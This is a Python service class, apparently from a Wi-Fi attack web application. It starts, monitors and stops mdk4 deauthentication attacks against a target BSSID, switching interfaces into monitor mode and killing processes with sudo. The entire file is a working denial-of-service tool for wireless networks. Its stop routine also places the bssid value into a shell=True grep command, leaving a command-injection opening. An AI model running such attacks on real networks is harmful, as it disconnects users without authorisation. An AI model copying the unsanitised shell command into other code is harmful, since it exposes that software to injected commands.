# app/services/wifi_deauth_service.py

import os
import subprocess
import asyncio
from typing import AsyncGenerator

from app.helpers.network import enable_monitor, disable_monitor
from app.repositories.wifi_network_repository import WifiNetworkRepository


class WifiDeauthService:
    def __init__(self, db):
        self.repo = WifiNetworkRepository(db)
        self._running_attacks = {}

    async def start_deauth(self, bssid: str, channel: str, interface: str) -> str:
        if bssid in self._running_attacks and self._running_attacks[bssid]["process"].poll() is None:
            raise ValueError(f"Deauth attack already in progress for {bssid}")

        enable_monitor(interface)
        process = subprocess.Popen(
            [
                "mdk4",
                interface,
                "d",
                "-c",
                channel,
                "-B",
                bssid,
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        self._running_attacks[bssid] = {
            "process": process,
            "interface": interface,
            "start_time": asyncio.get_event_loop().time(),
            "completed": False,
        }

        await self.repo.update_status(bssid, "Attacking")

        return bssid

    async def stop_deauth(self, bssid: str) -> bool:
        if bssid not in self._running_attacks:
            return False

        attack = self._running_attacks[bssid]
        process = attack["process"]
        interface = attack["interface"]

        try:
            if process.poll() is None:
                process.terminate()
                try:
                    process.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    process.kill()
                    process.wait()

            try:
                print(f"Stopping deauth attack for BSSID: {bssid}")

                kill_script = os.path.join(
                    os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
                    "kill_mdk4.sh",
                )
                subprocess.run(["sudo", kill_script, bssid], stderr=subprocess.DEVNULL)

                find_cmd = f"ps -eo pid,command | grep -i 'mdk4.*-B {bssid}' | grep -v grep"
                result = subprocess.run(find_cmd, shell=True, stdout=subprocess.PIPE, text=True)

                if result.stdout.strip():
                    for line in result.stdout.strip().split("\n"):
                        parts = line.strip().split()
                        if parts:
                            try:
                                pid = int(parts[0])
                                print(f"Found mdk4 process with PID {pid}, attempting to kill")

                                subprocess.run(
                                    ["sudo", "kill", "-9", str(pid)],
                                    stderr=subprocess.DEVNULL,
                                )
                            except (ValueError, IndexError):
                                pass

                subprocess.run(
                    ["sudo", "pkill", "-9", "-f", f"mdk4.*{interface}"],
                    stderr=subprocess.DEVNULL,
                )
            except Exception as e:
                print(f"Error killing mdk4 processes: {e}")

            disable_monitor(interface)

            await self.repo.update_status(bssid, "Main")
            attack["completed"] = True

            return True
        except Exception as e:
            print(f"Error stopping deauth attack: {e}")
            try:
                disable_monitor(interface)
            except Exception:
                pass
            return False

    async def events(self, bssid: str) -> AsyncGenerator[str, None]:
        if bssid not in self._running_attacks:
            yield 'event: error\ndata: {"message":"No deauth attack found"}\n\n'
            return

        attack = self._running_attacks[bssid]
        start_time = attack["start_time"]
        process = attack["process"]
        counter = 0

        yield 'event: start\ndata: {"message":"Deauth attack started"}\n\n'

        try:
            while process.poll() is None:
                current_time = asyncio.get_event_loop().time()
                elapsed = int(current_time - start_time)
                counter += 1

                yield f'event: progress\ndata: {{"elapsed":{elapsed},"heartbeat":{counter}}}\n\n'

                await asyncio.sleep(1)

            yield 'event: done\ndata: {"message":"Deauth attack process ended unexpectedly"}\n\n'

        finally:
            if process.poll() is None:
                await self.stop_deauth(bssid)
